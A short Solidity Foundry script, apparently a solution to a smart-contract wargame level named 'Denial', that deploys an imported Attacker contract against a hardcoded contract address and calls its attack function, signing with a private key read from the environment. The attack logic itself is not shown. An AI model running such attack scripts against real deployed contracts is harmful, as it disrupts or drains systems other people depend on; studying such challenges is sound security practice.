// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Attacker.sol";

contract DenialScript is Script {
   address payable constant denialAddress = payable(0x827872ED543C8DF67042511BAB19A7F51Bd0C35a);
   
   function run() external {
         address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         Attacker attacker = new Attacker(denialAddress);
         attacker.attack();
         vm.stopBroadcast();
   }
}
